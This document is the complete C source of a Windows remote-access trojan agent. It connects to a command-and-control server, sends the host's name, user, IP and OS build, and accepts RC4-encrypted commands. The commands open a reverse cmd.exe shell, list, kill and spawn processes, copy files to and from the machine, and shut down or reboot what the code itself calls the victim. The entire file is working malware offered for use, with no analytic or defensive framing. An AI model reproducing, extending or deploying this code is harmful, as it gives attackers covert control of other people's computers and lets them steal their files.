#include<stdio.h>
#include<WinSock2.h>
#include<winsock.h>
#include<Windows.h>
#include<Psapi.h>
#include<TlHelp32.h>
#include<versionhelpers.h>
#include<ws2tcpip.h>
#include<WinBase.h>
#include<wincrypt.h>
#include<Lmcons.h>
#pragma comment(lib, "ws2_32.lib")

#define BREAK_WITH_SOCKET_ERROR(e, s) {printf("[-] %s. Error code = %d\n", \
e, WSAGetLastError()); closesocket(s); ExitProcess(0); }
#define BREAK_WITH_ERROR(e){printf("[-] %s. Error code = %d\n", e, GetLastError()); ExitProcess(0);}
#define OBFUSCATE_XOR(a, b, c) a = (b | c) & (~b | ~c); 

// length of buffer
#define MAX_CHUNK 1025
#define MAX_BOX 256
#define MAX_KEY 16

// custom command
#define ENUMERATE_PROCESS_COMMAND 's'
#define ENCRYPTED_REVERSE_SHELL_COMMAND 'y'
#define TERMINATE_PROCESS_COMMAND 'a'
#define SPAWN_PROCESS_COMMAND 'o'
#define UPLOAD_FILE_COMMAND 'r'
#define CHANGE_DOMAIN_COMMAND 'e'
#define CHANGE_PORT_COMMAND 'n'
#define DELETE_TRACE_COMMAND 'm'
#define SHUTDOWN_REBOOT_COMMAND 't'
#define DOWNLOAD_FILE_COMMAND 'd'
#define QUERY_RC4_KEY_COMMAND 'x'
#define ERROR_COMMAND 'q'

// custom status
#define CREATE_FILE_FAILED 0 
#define CREATE_FILE_SUCCESS 1

#define OPEN_FILE_FAILED 0
#define OPEN_FILE_SUCCESS 1

#define SPAWN_PROCESS_FAILED 0
#define SPAWN_PROCESS_SUCCESS 1

#define TERMINATE_PROCESS_FAILED 0
#define TERMINATE_PROCESS_SUCCESS 1

#define SHUTDOWN_OR_REBOOT_FAILED 0
#define SHUTDOWN_OR_REBOOT_SUCCESS 1

typedef struct pipesock{ 
	SOCKET ioSock;
	HANDLE hPipe;
} PIPESOCK, *PPIPESOCK;

BYTE box[MAX_BOX];
BYTE rc4Key[MAX_KEY + 1];

VOID Swap(BYTE* a, BYTE* b) {
	BYTE temp = *a;
	*a = *b;
	*b = temp;
}

VOID RC4Init() {
	DWORD i, j = 0;
	for (i = 0; i < 256; i++) {
		box[i] = i;
	}
	for (i = 0; i < 256; i++) {
		j = (j + box[i] + rc4Key[i % MAX_KEY]) % 256;
		Swap(&box[i], &box[j]);
	}
}

VOID RC4Crypt(BYTE* buf, DWORD dwBufLen) {
	DWORD i = 0, j = 0;
	for (DWORD n = 0; n != dwBufLen; n++) {
		i = (i + 1) % 256;
		j = (j + box[i]) % 256;
		Swap(&box[i], &box[j]);
		BYTE k = box[(box[i] + box[j]) % 256];
		OBFUSCATE_XOR(buf[n], buf[n], k);
	}
}

VOID RC4CryptSegment(BYTE* buf, DWORD dwCurBytesRecv, DWORD* i, DWORD* j) {
	for (DWORD n = 0; n != dwCurBytesRecv; n++) {
		*i = (*i + 1) % 256;
		*j = (*j + box[*i]) % 256;
		Swap(&box[*i], &box[*j]);
		BYTE k = box[(box[*i] + box[*j]) % 256];
		OBFUSCATE_XOR(buf[n], buf[n], k);
	}
}

BOOL SendLargeChunk(SOCKET ioSock, LPVOID lpBuf, DWORD dwBufSize) {
	DWORD dwBytesSend = 0, dwCurBytesSend = 0;
	if (send(ioSock, &dwBufSize, sizeof(dwBufSize), 0) < 0) {
		printf("[-] failed to send buffer size. Erorr code = %d\n", GetLastError());
		return FALSE;
	}
	while (1) {
		dwCurBytesSend = send(ioSock, (CHAR*)lpBuf + dwBytesSend, dwBufSize - dwBytesSend, 0);
		if (dwCurBytesSend < 0) {
			printf("[-] send data failed. Erorr code = %d\n", GetLastError());
			return FALSE;
		}
		dwBytesSend += dwCurBytesSend;
		if (dwBytesSend >= (int)dwBufSize)break;
	}
	return TRUE;
}

VOID SendSmallChunk(SOCKET ioSock, LPBYTE sendBuf) {
	RC4Init();
	RC4Crypt(sendBuf, MAX_CHUNK - 1);
	while (send(ioSock, sendBuf, MAX_CHUNK - 1, 0) < 0) {
		printf("[-] Failed to send status to C2 server. Error code = %d\n", GetLastError());
		Sleep(500);
	}
}

//handle enumerate process in agent side
BOOL ProcessEnumeration(SOCKET ioSock) {
	SYSTEM_INFO si;
	LPVOID lpMemAlloc;
	HANDLE hSnapShot, hHeap;
	PROCESSENTRY32W processEntry;
	WCHAR processInfo[MAX_PATH + 10];
	DWORD dwBufSize = 0, dwNumOfBytesHeap = 0, dwPageSize = 0;

	ZeroMemory(&si, sizeof(si));
	GetSystemInfo(&si);
	dwPageSize = si.dwPageSize;
	hHeap = HeapCreate(0, 0, 0);
	if (!hHeap) {
		printf("[-] Failed to create heap. Error code = %d\n", GetLastError());
		return FALSE;
	}
	lpMemAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwPageSize * 8);
	if (!lpMemAlloc) {
		printf("[-] Failed to allocate memory for heap. Error code = %d\n", GetLastError());
		return FALSE;
	}
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapShot) {
		printf("[-] Failed to create process snapshot. Error code = %d\n", GetLastError());
		return FALSE;
	}
	ZeroMemory(&processEntry, sizeof(processEntry));
	processEntry.dwSize = sizeof(processEntry);
	if (Process32FirstW(hSnapShot, &processEntry)) {
		do{
			swprintf(processInfo, sizeof(processInfo)/sizeof(processInfo[0]), 
				L"%d %ls\n", processEntry.th32ProcessID, processEntry.szExeFile);
			RtlMoveMemory((WCHAR*)lpMemAlloc + dwNumOfBytesHeap, processInfo, sizeof(processInfo));
			dwNumOfBytesHeap += (DWORD)wcslen(processInfo);
		} while (Process32NextW(hSnapShot, &processEntry));
	}
	dwBufSize = (dwNumOfBytesHeap + 1) * 2;
	RC4Init();
	RC4Crypt(lpMemAlloc, dwBufSize);
	if (!SendLargeChunk(ioSock, lpMemAlloc, dwBufSize)) {
		printf("[-] Failed to send list process to C2 server. Error code = %d\n", GetLastError());
		return FALSE;
	}
	if (!HeapFree(hHeap, 0, lpMemAlloc)) {
		printf("[-] Failed to free heap. Error code = %d\n", GetLastError());
		return FALSE; 
	}
	if (!HeapDestroy(hHeap)) {
		printf("[-] Failed to destroy heap. Error code = %d\n", GetLastError());
		return FALSE;
	}	
	printf("[+] Enumerate processes success\n");
	return TRUE;
}

DWORD WINAPI SendCommandToCmd(PPIPESOCK pPipeSock) {
	CHAR command[MAX_CHUNK];
	SOCKET ioSock = pPipeSock->ioSock;
	HANDLE hWriteHandle = pPipeSock->hPipe;
	int dwNumOfBytesRead = 0, dwNumOfBytesWritten = 0;
	while (1) {
		dwNumOfBytesRead = recv(ioSock, command, MAX_CHUNK - 1, 0);
		if (dwNumOfBytesRead < 0) {
			printf("[-] Failed to receive command from C2. Error code=%d\n", GetLastError());
			ExitThread(0);
		}
		RC4Init();
		RC4Crypt(command, dwNumOfBytesRead);
		if (RtlCompareMemory(command, "exit", 4) == 4) {
			ExitThread(0);
		}
		if (!WriteFile(hWriteHandle, command, dwNumOfBytesRead, &dwNumOfBytesWritten, NULL)) {
			printf("[-] Failed to send command to cmd.exe. Error code = %d\n", GetLastError());
			ExitThread(0);
		}
	}
	return 1;
}

DWORD WINAPI ReadDataFromCmd(PPIPESOCK pPipeSock) {
	HANDLE hHeap;
	SYSTEM_INFO si;
	DWORD dwPageSize;
	LPVOID lpMemAlloc;
	CHAR lpPeekBuffer[MAX_CHUNK];
	SOCKET ioSock = pPipeSock->ioSock;
	HANDLE hReadPipe = pPipeSock->hPipe;
	DWORD dwNumOfBytesHeap = 0, dwNumOfBytesPeek = 0, dwNumOfBytesRead;

	ZeroMemory(&si, sizeof(si));
	GetSystemInfo(&si);
	dwPageSize = si.dwPageSize;
	hHeap = HeapCreate(0, 0, 0);
	if (!hHeap) {
		printf("[-] Failed to create heap. Error code = %d\n", GetLastError());
		ExitProcess(0);
	}
	lpMemAlloc = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwPageSize * 128);
	if (!lpMemAlloc) {
		printf("[-] Failed to allocate memory for heap. Error code = %d\n", GetLastError());
		ExitProcess(0);
	}
	while (PeekNamedPipe(hReadPipe, lpPeekBuffer, 4, &dwNumOfBytesPeek, NULL, NULL)) {
		if (dwNumOfBytesPeek) {
			if (!ReadFile(hReadPipe, (CHAR*)lpMemAlloc + dwNumOfBytesHeap, MAX_CHUNK - 1, &dwNumOfBytesRead, NULL)) {
				printf("[-] Failed to read data from cmd.exe. Error code = %d\n", GetLastError());
				ExitProcess(0);
			}
			dwNumOfBytesHeap += dwNumOfBytesRead;
		}
		else if (dwNumOfBytesHeap){
			((BYTE*)lpMemAlloc)[dwNumOfBytesHeap] = '\0';
			RC4Init();
			RC4Crypt(lpMemAlloc, dwNumOfBytesHeap);
			SendLargeChunk(ioSock, lpMemAlloc, dwNumOfBytesHeap);
			dwNumOfBytesHeap = 0;
		}
	}
	if (!HeapFree(hHeap, 0, lpMemAlloc)) {
		printf("[-] Failed to free heap. Error code = %d\n", GetLastError());
		ExitProcess(0);
	}
	if (!HeapDestroy(hHeap)) {
		printf("[-] Failed to destroy heap. Error code = %d\n", GetLastError());
		ExitProcess(0);
	}
	return 1;
}

BOOL EncryptedReverseShell(SOCKET ioSock) {
	STARTUPINFOA si;
	DWORD dwEventIndex;
	BOOL bRetVal = FALSE;
	HANDLE handleList[3];
	PROCESS_INFORMATION pi;
	SECURITY_ATTRIBUTES pipeAttributes;
	PIPESOCK ReadPipeSock, WritePipeSock;
	DWORD dwReadThreadID, dwWriteThreadID;
	HANDLE hReadThread = NULL, hWriteThread = NULL;
	HANDLE hParentReadPipe = NULL, hChildWritePipe = NULL;
	HANDLE hChildReadPipe = NULL, hParentWritePipe = NULL;
	CHAR lpCmdName[] = "\"C:\\Windows\\System32\\cmd.exe\"";

	pipeAttributes.bInheritHandle = TRUE;
	pipeAttributes.lpSecurityDescriptor = NULL;
	pipeAttributes.nLength = sizeof(pipeAttributes);
	if (!CreatePipe(&hParentReadPipe, &hChildWritePipe, &pipeAttributes, 0)) {
		printf("[-] Failed to create first pipe. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	if (!CreatePipe(&hChildReadPipe, &hParentWritePipe, &pipeAttributes, 0)) {
		printf("[-] Failed to create second pipe. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	printf("[+] Create pipe success\n");
	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = hChildReadPipe;
	si.hStdOutput = hChildWritePipe;
	si.hStdError = hChildWritePipe;
	if (!CreateProcessA(NULL, lpCmdName, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
		printf("[-] Failed to create reverse shell. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	ReadPipeSock.ioSock = ioSock;
	WritePipeSock.ioSock = ioSock;
	ReadPipeSock.hPipe = hParentReadPipe;
	WritePipeSock.hPipe = hParentWritePipe;
	hReadThread = CreateThread(NULL, 0, ReadDataFromCmd, (LPVOID)&ReadPipeSock, 0, &dwReadThreadID);
	if (!hReadThread) {
		printf("[-] Failed to create read thread. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	hWriteThread = CreateThread(NULL, 0, SendCommandToCmd, (LPVOID)&WritePipeSock, 0, &dwWriteThreadID);
	if (!hWriteThread) {
		printf("[-] Failed to create write thread. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	handleList[0] = pi.hProcess;
	handleList[1] = hReadThread;
	handleList[2] = hWriteThread;
	dwEventIndex = WaitForMultipleObjects(3, handleList, FALSE, INFINITE);
	if (dwEventIndex == 0) {
		TerminateThread(handleList[1], 0);
		TerminateThread(handleList[2], 0);
	}
	else if (dwEventIndex == 1) {
		TerminateThread(handleList[2], 0);
		TerminateProcess(handleList[0], 0);
	}
	else if (dwEventIndex == 2) {
		TerminateThread(handleList[1], 0);
		TerminateProcess(handleList[0], 0);
	}
	else {
		TerminateProcess(handleList[0], 0);
		TerminateThread(handleList[1], 0);
		TerminateThread(handleList[2], 0);
	}
	bRetVal = TRUE;
EXIT:
	CloseHandle(hParentReadPipe);
	CloseHandle(hParentWritePipe);
	CloseHandle(hChildReadPipe);
	CloseHandle(hChildWritePipe);
	CloseHandle(hWriteThread);
	CloseHandle(hReadThread);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	printf("[+] Encrypted reverse shell close\n");
	return bRetVal;
}

BOOL ProcessTermination(SOCKET ioSock, LPBYTE buffer) {
	UINT uiExitCode = 0; 
	DWORD dwProcessID = 0;
	HANDLE hProcess = NULL;
	BYTE sendBuf[MAX_CHUNK];
	BOOL bReturnStatus = FALSE;

	sendBuf[0] = TERMINATE_PROCESS_FAILED;
	dwProcessID = *((DWORD*)(buffer + 1));
	hProcess = OpenProcess(PROCESS_TERMINATE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessID);
	if (!hProcess) {
		printf("[-] Failed to open target process. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	if (!TerminateProcess(hProcess, uiExitCode)) {
		printf("[-] Failed to terminate process\n");
		goto EXIT;
	}
	ZeroMemory(sendBuf, MAX_CHUNK);
	sendBuf[0] = TERMINATE_PROCESS_SUCCESS;
	bReturnStatus = TRUE;
EXIT:
	SendSmallChunk(ioSock, sendBuf);
	CloseHandle(hProcess);
	return bReturnStatus;
}

BOOL ProcessSpawn(SOCKET ioSock, LPBYTE buffer) {
	STARTUPINFO si;
	LPWSTR lpProcessPath;
	BOOL bRetVal = FALSE;
	PROCESS_INFORMATION pi;
	BYTE sendBuf[MAX_CHUNK];

	sendBuf[0] = SPAWN_PROCESS_FAILED;
	lpProcessPath = buffer + 1;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));
	si.cb = sizeof(si);
	if (!CreateProcessW(NULL, lpProcessPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		printf("[-] Failed to create process spawn. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	ZeroMemory(sendBuf, MAX_CHUNK);
	sendBuf[0] = SPAWN_PROCESS_SUCCESS;
	bRetVal = TRUE;
EXIT:
	SendSmallChunk(ioSock, sendBuf);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return bRetVal;
}

BOOL EnableShutDownPrivilege() {
	HANDLE hToken;
	BOOL bRetVal = FALSE;
	TOKEN_PRIVILEGES tkp;
	HANDLE hCurProcess = GetCurrentProcess();

	if (!OpenProcessToken(hCurProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		printf("[-] Failed to get process token. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
		printf("[-] Failed to look up privilege value. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL)) {
		printf("[-] Failed to adjust token privilege. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	bRetVal = TRUE;
EXIT:
	CloseHandle(hCurProcess);
	CloseHandle(hToken);
	return bRetVal;
}

BOOL ShutDownOrRebootVictim(SOCKET ioSock, LPBYTE buffer) {
	DWORD bTimeOut = 0;
	BOOL bRetVal = FALSE;
	BYTE sendBuf[MAX_CHUNK];
	BOOL bRebootAfterShutdown = TRUE;

	sendBuf[0] = SHUTDOWN_OR_REBOOT_FAILED;
	bTimeOut = *(DWORD*)(buffer + 2) >= 5 ? *(DWORD*)(buffer + 2) : 5;
	if (buffer[1] == 1) bRebootAfterShutdown = FALSE;
	if (!EnableShutDownPrivilege())return FALSE;
	if (!InitiateSystemShutdownA(NULL, NULL, bTimeOut, FALSE, bRebootAfterShutdown)) {
		printf("[-] Failed to shut down or reboot computer. Error code = %d\n", GetLastError());
		goto EXIT;
	}
	bRetVal = TRUE;
	sendBuf[0] = SHUTDOWN_OR_REBOOT_SUCCESS;
EXIT:
	SendSmallChunk(ioSock, sendBuf);
	return bRetVal;
}

BOOL UploadFile(SOCKET ioSock, LPBYTE buffer) {
	HANDLE hFile;
	LPWSTR lpFilePath;
	DWORD dwSizeOfFile;
	DWORD i = 0, j = 0;
	DWORD dwNumOfBytesWritten = 0;
	DWORD dwBytesRecv = 0, dwCurBytesRecv = 0;
	BYTE recvBuf[MAX_CHUNK], sendBuf[MAX_CHUNK];

	// parse the command
	sendBuf[0] = CREATE_FILE_FAILED;
	dwSizeOfFile = *(DWORD*)(buffer + 1);
	lpFilePath = buffer + 5;
	// create a new file and send feedback to C2 server
	hFile = CreateFileW(lpFilePath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if(!hFile){
		printf("[-] Failed to create new file. Error code = %d\n", GetLastError());
		SendSmallChunk(ioSock, sendBuf);
		return FALSE;
	}
	sendBuf[0] = CREATE_FILE_SUCCESS;
	SendSmallChunk(ioSock, sendBuf);
	// receive malicious file from C2 server
	RC4Init();
    while (1) {
        dwCurBytesRecv = recv(ioSock, recvBuf, MAX_CHUNK - 1, 0);
        if (dwCurBytesRecv < 0) {
            printf("[-] Failed to receive bytes\n");
            break;
        }
		RC4CryptSegment(recvBuf, dwCurBytesRecv, &i, &j);
		WriteFile(hFile, recvBuf, dwCurBytesRecv, &dwNumOfBytesWritten, NULL);
        dwBytesRecv += dwCurBytesRecv;
        if (dwBytesRecv >= dwSizeOfFile) {
            break;
        }
    }
	CloseHandle(hFile);
	return TRUE;
}

BOOL DownLoadFile(SOCKET ioSock, LPBYTE buffer) {
	HANDLE hFile;
	DWORD dwFileSize;
	LPWSTR lpFilePath;
	DWORD i = 0, j = 0;
	DWORD dwPathFileSize;
	BYTE sendBuf[MAX_CHUNK];
	DWORD dwNumOfBytesRead = 0;

	lpFilePath = buffer + 1;
	hFile = CreateFileW(lpFilePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	sendBuf[0] = OPEN_FILE_FAILED;
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Fail open file. Error code: %d\n", GetLastError());
		SendSmallChunk(ioSock, sendBuf);
		return FALSE;
	}
	sendBuf[0] = OPEN_FILE_SUCCESS;
	dwFileSize = GetFileSize(hFile, NULL);
	*(DWORD*)(sendBuf + 1) = dwFileSize;
	SendSmallChunk(ioSock, sendBuf);
	RC4Init();
	while (1) {
		if (!ReadFile(hFile, sendBuf, MAX_CHUNK - 1, &dwNumOfBytesRead, NULL)) {
			printf("[-] Failed to read chunk data from target file. Error code = %d\n", GetLastError());
			return FALSE;
		}
		if (!dwNumOfBytesRead)break;
		RC4CryptSegment(sendBuf, dwNumOfBytesRead, &i, &j);
		if (send(ioSock, sendBuf, dwNumOfBytesRead, 0) < 0) {
			printf("[-] Failed to send a chunk data to C2. Error code = %d\n", GetLastError());
			return FALSE;
		}
	}
	printf("[+] Send file success\n");
	return TRUE;
}

BOOL SendSysInfoAndRecvKey(SOCKET ioSock) {
	LSTATUS status;
	CHAR* ipv4Addr;
	DWORD dwType = 0;
	CHAR curBuildNum[32];
	SOCKADDR_IN localAddr = { 0 };
	DWORD lenAddr = sizeof(localAddr);
	BYTE sendBuf[MAX_CHUNK], recvBuf[MAX_CHUNK];
	WCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
	WCHAR userName[UNLEN + 1];
	DWORD dwUserNameSz = sizeof(userName);
	DWORD dwComputerNameSz = sizeof(computerName);
	LPCSTR lpSubKey = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
	DWORD dwCurMajVer = 0, dwCurMinVer = 0, dwCurBuildNum = 0, dwRevNum = 0;
	DWORD dwRevNumSz = sizeof(dwRevNum), dwCurMajVerSz = sizeof(dwCurMajVer);
	DWORD dwCurMinVerSz = sizeof(dwCurMinVer), dwCurBuildNumSz = sizeof(curBuildNum);
	
	// first connect to sever
	ZeroMemory(sendBuf, MAX_CHUNK);
	sendBuf[0] = QUERY_RC4_KEY_COMMAND;
	if (send(ioSock, sendBuf, MAX_CHUNK - 1, 0) < 0) {
		printf("[-] Failed to query key from C2. Error code = %d\n", GetLastError());
		return FALSE;
	}
	// receive rc4 key from C2
	if (recv(ioSock, recvBuf, MAX_CHUNK - 1, 0) < 0) {
		printf("[-] Failed to receive rc4 key. Error code = %d\n", GetLastError());
		return FALSE;
	}
	RtlCopyMemory(rc4Key, recvBuf, MAX_KEY + 1);
	printf("[+] RC4 key: %s\n", rc4Key);
	// send system information to C2 server
	if (!GetComputerNameW(computerName, &dwComputerNameSz)) {
		printf("[-] Failed to get computer name. Error code = %d\n", GetLastError());
		return FALSE;
	}
	if (!GetUserNameW(userName, &dwUserNameSz)) {
		printf("[-] Failed to get user name. Error code = %d\n", GetLastError());
		return FALSE;
	}
	getsockname(ioSock, (SOCKADDR*)&localAddr, &lenAddr);
	ipv4Addr = inet_ntoa(localAddr.sin_addr);
	status = RegGetValueA(HKEY_LOCAL_MACHINE, lpSubKey, "CurrentMajorVersionNumber",
		RRF_RT_REG_DWORD, &dwType, &dwCurMajVer, &dwCurMajVerSz);
	if (status != ERROR_SUCCESS) {
		printf("[-] Failed to get current major version number. Error code = %d\n", GetLastError());
		return FALSE;
	}
	status = RegGetValueA(HKEY_LOCAL_MACHINE, lpSubKey, "CurrentMinorVersionNumber",
		RRF_RT_REG_DWORD, &dwType, &dwCurMinVer, &dwCurMinVerSz);
	if (status != ERROR_SUCCESS) {
		printf("[-] Failed to get current minor version number. Error code = %d\n", GetLastError());
		return FALSE;
	}
	if (dwCurMajVer != 0x0a || dwCurMinVer != 0) {
		printf("[-] OS version is not a target\n");
		return FALSE;
	}
	ZeroMemory(curBuildNum, dwCurBuildNumSz);
	status = RegGetValueA(HKEY_LOCAL_MACHINE, lpSubKey, "CurrentBuildNumber",
		RRF_RT_REG_SZ, &dwType, curBuildNum, &dwCurBuildNumSz);
	if (status != ERROR_SUCCESS) {
		printf("[-] Failed to get value. Error code = %d\n", GetLastError());
		return FALSE;
	}
	dwCurBuildNum = atoi(curBuildNum);
	status = RegGetValueA(HKEY_LOCAL_MACHINE, lpSubKey, "UBR", 
		RRF_RT_REG_DWORD, &dwType, &dwRevNum, &dwRevNumSz);
	if (status != ERROR_SUCCESS) {
		printf("[-] Failed to get revison version. Error code = %d\n", GetLastError());
		return FALSE;
	}
	wprintf(L"[+] Computer name: %ls\n", computerName);
	wprintf(L"[+] User name: %ls\n", userName);
	printf("[+] Ipv4 address: %s\n", ipv4Addr);
	printf("[+] Major version = %u\n", dwCurMajVer);
	printf("[+] Minor version = %u\n", dwCurMinVer);
	printf("[+] Build version = %d\n", dwCurBuildNum);
	printf("[+] Revision version = %u\n", dwRevNum);
	ZeroMemory(sendBuf, sizeof(sendBuf));
	RtlCopyMemory(sendBuf, computerName, sizeof(computerName) * 2);
	wprintf("ettes: %ls\n", sendBuf);
	RtlCopyMemory(sendBuf + 32, userName, dwUserNameSz * 2);
	RtlCopyMemory(sendBuf + 576, ipv4Addr, strlen(ipv4Addr));
	RtlCopyMemory(sendBuf + 608, &dwCurBuildNum, sizeof(dwCurBuildNum));
	RtlCopyMemory(sendBuf + 612, &dwRevNum, sizeof(dwRevNum));
	RC4Init();
	RC4Crypt(sendBuf, MAX_CHUNK - 1);
	if (send(ioSock, sendBuf, MAX_CHUNK - 1, 0) < 0) {
		printf("[+] Failed to send system information to C2. Error code = %d\n", GetLastError());
		return FALSE;
	}
	printf("[+] Send system information to C2 success\n");
	return TRUE;
}

BOOL CheckActiveAgent(SOCKET ioSock) {
	BYTE* sendBuf[MAX_CHUNK];
	ZeroMemory(sendBuf, MAX_CHUNK);
	sendBuf[0] = '.';
	if (send(ioSock, sendBuf, MAX_CHUNK, 0) < 0) {
		printf("[-] Fail send active information to c2.\n");
		return FALSE;
	}
	return TRUE;
}

BOOL ReceiveCommandFromC2(SOCKET ioSock) {
	CHAR command[MAX_CHUNK];
	while(1){
		printf("[+] Waiting for receiving command from C2 server...\n");
		if (recv(ioSock, command, MAX_CHUNK - 1, 0) < 0) {
			printf("[-] Failed to receive command. Error code = %d\n", GetLastError());
			return FALSE;
		}
		RC4Init();
		RC4Crypt(command + 1, MAX_CHUNK - 2);
		switch (command[0])
		{
		case ENUMERATE_PROCESS_COMMAND:
			ProcessEnumeration(ioSock);
			break;
		case ENCRYPTED_REVERSE_SHELL_COMMAND:
			EncryptedReverseShell(ioSock);
			break;
		case TERMINATE_PROCESS_COMMAND:
			ProcessTermination(ioSock, command);
			break;
		case SPAWN_PROCESS_COMMAND:
			ProcessSpawn(ioSock, command);
			break;
		case SHUTDOWN_REBOOT_COMMAND:
			ShutDownOrRebootVictim(ioSock, command);
			break;
		case UPLOAD_FILE_COMMAND:
			UploadFile(ioSock, command);
			break;
		case DOWNLOAD_FILE_COMMAND:
			DownLoadFile(ioSock, command);
			break;
		default:
			break;
		}
	}
	return TRUE;
}



int wmain(int argc, WCHAR** argv) {
	WSADATA wsaData;
	SOCKADDR_IN clntAddr;
	SOCKET clntSock = INVALID_SOCKET;

	printf("*************************************NETWORK INFORMATION****************************\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsaData))
	BREAK_WITH_SOCKET_ERROR("Failed to startup socket environment", clntSock)

	clntSock = socket(AF_INET, SOCK_STREAM, 0);
	if (clntSock == INVALID_SOCKET)
	BREAK_WITH_SOCKET_ERROR("Failed to create a new socket", clntSock)

	ZeroMemory(&clntAddr, sizeof(clntAddr));
	clntAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	clntAddr.sin_family = AF_INET;
	clntAddr.sin_port = htons(5555);
	if(connect(clntSock, (struct sockaddr*) & clntAddr, sizeof(clntAddr)) == SOCKET_ERROR)
	BREAK_WITH_SOCKET_ERROR("Failed to connect to server", clntSock);

	printf("[+] Connect to C2 server success\n");
	SendSysInfoAndRecvKey(clntSock);
	ReceiveCommandFromC2(clntSock);
	shutdown(clntSock, SD_BOTH);
	closesocket(clntSock);
	WSACleanup();
	printf("[+] Close connection\n");
	return 0;
}
